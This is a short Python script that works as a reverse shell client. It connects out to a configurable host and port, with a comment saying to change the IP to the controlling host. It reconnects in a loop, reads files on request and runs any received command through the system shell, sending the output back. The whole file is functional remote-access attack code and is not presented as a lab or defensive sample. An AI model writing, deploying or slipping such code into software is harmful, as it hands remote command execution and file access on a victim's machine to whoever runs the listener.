#! /usr/bin/python3
import os
# To run process
import subprocess
import socket
#update this ip according to host
host="127.0.0.1"
port=8090
def socketSend(sock):
    while True:
        cmd=sock.recv(1024)
        cmd=cmd.decode()
        # Subprocess cant do anything related to directory
        if(cmd[:2]=="cd"):
            try:
                os.chdir(cmd[3:])
                sock.send(os.getcwd().encode())
            except:
                sock.send("# No such directory".encode())
        # Reading filee using file handling
        elif(cmd[:3]=="cat"):
            try:
                f=open(cmd[4:],'rt')
                sock.send(str(f.read()).encode())
                f.close()
            except:
                sock.send("# No Such File or check name ".encode())
        elif(cmd[:]=='exit'):
            return
        else:
            rply=subprocess.run(cmd[:], capture_output=True, shell=True)
            if(rply.returncode==0):
                sock.send(rply.stdout)
            else:
                sock.send("# Invalid Command ".encode())


def main():
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Keeping connection alive
    while True:

        try:
            sock.connect((host,port))
            socketSend(sock)
        except:
            continue
        sock.close()
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        continue
main()
